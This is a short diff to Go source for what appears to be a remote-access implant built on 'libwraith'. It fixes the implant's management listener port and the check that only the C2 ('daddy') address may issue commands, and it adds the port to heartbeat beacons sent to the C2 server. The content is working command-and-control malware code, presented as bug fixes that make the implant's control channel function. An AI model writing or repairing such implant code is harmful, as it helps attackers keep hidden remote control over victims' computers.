@@ -165,7 +165,9 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	// Set up and start management API.
 	//
 
-	port := rand.Intn(radio.MGMT_PORT_MAX-radio.MGMT_PORT_MIN) + radio.MGMT_PORT_MIN
+	port := rand.Intn(
+		radio.MGMT_LISTEN_PORT_MAX-radio.MGMT_LISTEN_PORT_MIN,
+	) + radio.MGMT_LISTEN_PORT_MIN
 	tcpListener, _ := s.ListenTCP(&net.TCPAddr{Port: port})
 
 	mux := http.NewServeMux()
@@ -176,7 +178,8 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		defer daddyPubKeyBytes.Destroy()
 
 		// Verify that the connection is coming from C2.
-		if req.RemoteAddr != net.IP(daddyIPBytes.Bytes()).String() {
+		remoteAddr, _, _ := net.SplitHostPort(req.RemoteAddr)
+		if remoteAddr != net.IP(daddyIPBytes.Bytes()).String() {
 			// You're not my daddy!
 			res.WriteHeader(http.StatusForbidden)
 			return
@@ -357,7 +360,7 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 						Method: http.MethodPost,
 						URL: &url.URL{
 							Scheme: "http",
-							Host:   net.IP(daddyIP.Bytes()).String(),
+							Host:   fmt.Sprintf("[%s]:%d", net.IP(daddyIP.Bytes()).String(), radio.MGMT_CONNECT_PORT),
 							Path:   proto.ROUTE_PREFIX + proto.ROUTE_HEARTBEAT,
 						},
 						Cancel: ctx.Done(),
